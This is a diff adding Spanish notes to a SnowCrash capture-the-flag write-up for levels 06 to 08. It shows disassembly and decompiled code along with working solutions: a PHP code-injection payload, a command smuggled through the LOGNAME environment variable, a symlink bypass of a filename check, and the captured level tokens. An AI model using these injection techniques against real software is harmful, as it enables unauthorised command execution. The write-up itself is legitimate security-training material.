@@ -118,3 +118,134 @@ level05@SnowCrash:/var/crash$ cat getflag.sh
 
 Y en el ichero flag05 aparece
 Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+## Level 06
+En level 6 encontramos un fichero PHP y un ejecutable.
+Cuando ejecutamos 
+objdump -d -M Intel level06
+
+vemos emn main una serie de instrucciones:
+08048450 <main>:
+...
+ 80484f9:	50                   	push   %eax
+ 80484fa:	68 d5 87 04 08       	push   $0x80487d5
+ 80484ff:	c7 45 d4 d5 87 04 08 	movl   $0x80487d5,-0x2c(%ebp)
+ 8048506:	c7 45 d8 e2 87 04 08 	movl   $0x80487e2,-0x28(%ebp)
+ 804850d:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
+ 8048514:	e8 17 ff ff ff       	call   8048430 <execve@plt>
+
+Veamos que hay en las posiciones $0x80487d5 y $0x80487e2:
+level06@SnowCrash:~$ gdb -batch -ex "x/s 0x80487d5" ./level06
+0x80487d5:	 "/usr/bin/php"
+level06@SnowCrash:~$ gdb -batch -ex "x/s 0x80487e2" ./level06
+0x80487e2:	 "/home/user/level06/level06.php"
+
+Hay que crear un fichero que contenga dentro el siguiente texto:
+[x ${'getflag'}]
+
+Luego hay que ejecutar
+./level06 [nombre del fichero]
+
+se imprime el token wiok45aaoguiboiki2tuin6ub
+
+## Level 07
+
+ejecutando strings level07 obtenemos :
+...
+LOGNAME
+/bin/echo %s 
+...
+
+con objdump -d -M Intel level07
+
+se obtiene: 
+08048400 <getenv@plt>:
+ 8048400:	ff 25 0c a0 04 08    	jmp    *0x804a00c
+ 8048406:	68 18 00 00 00       	push   $0x18
+ 804840b:	e9 b0 ff ff ff       	jmp    80483c0 <_init+0x3c>
+
+ 08048440 <asprintf@plt>:
+ 8048440:	ff 25 1c a0 04 08    	jmp    *0x804a01c
+ 8048446:	68 38 00 00 00       	push   $0x38
+ 804844b:	e9 70 ff ff ff       	jmp    80483c0 <_init+0x3c>
+
+en el primero asumoq ue se recibe la variable env LOGNAME
+cambio la variable LOGNAME por :
+export LOGNAME = ";getflag"
+
+Al ejecutar ./level07 tecibo 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+## Level08
+
+aparecen 2 ficheros level08 (ejecutable) y token
+Al decompilar level08 aparece:
+
+int main(int argc, char** argv, char** envp)
+{...
+si no hay argumento
+    if(argc == 1) {
+        _v1072 =  *_v1048;
+         *__esp = "%s [file to read]\n";
+        printf();
+         *__esp = 1;
+        exit();
+    }
+### Si el fichero tiene la palabra token salir
+    _t40 = _v1048[1];
+    _v1072 = "token";
+     *__esp = _t40;
+    strstr();
+### Si no tienes acceso salir
+    if(_t40 != 0) {
+        _v1072 = _v1048[1];
+         *__esp = "You may not access '%s'\n";
+        printf();
+         *__esp = 1;
+        exit();
+    }
+### Si no se puede abrir salir
+    _t43 = _v1048[1];
+    _v1072 = 0;
+     *__esp = _t43;
+    open();
+    _v1040 = _t43;
+    if(_v1040 == -1) {
+        _v1068 = _v1048[1];
+        _v1072 = "Unable to open %s";
+         *__esp = 1;
+        L08048440();
+    }
+### Si no se puede leer salir
+    _v1068 = 1024;
+    _v1072 =  &_v1032;
+    _t45 = _v1040;
+     *__esp = _t45;
+    read();
+    _v1036 = _t45;
+    if(_v1036 == -1) {
+        _v1068 = _v1040;
+        _v1072 = "Unable to read fd %d";
+         *__esp = 1;
+        L08048440();
+    }
+### En caso comprario imprime
+    _v1068 = _v1036;
+    _v1072 =  &_v1032;
+     *__esp = 1;
+    write();
+    if((_v8 ^  *gs:0x14]) != 0) {
+        __stack_chk_fail();
+        return  &_v1032;
+    }
+    return  &_v1032;
+}
+
+Solucion: hacer un link que lleva a token. En nuestro caso
+ln -s 
+
+ln -s /home/user/level08/token /var/crash/mitk
+
+ejecutando luego ./level08 /var/crash/mitk obtenemos el token
+
+quif5eloekouj29ke0vouxean
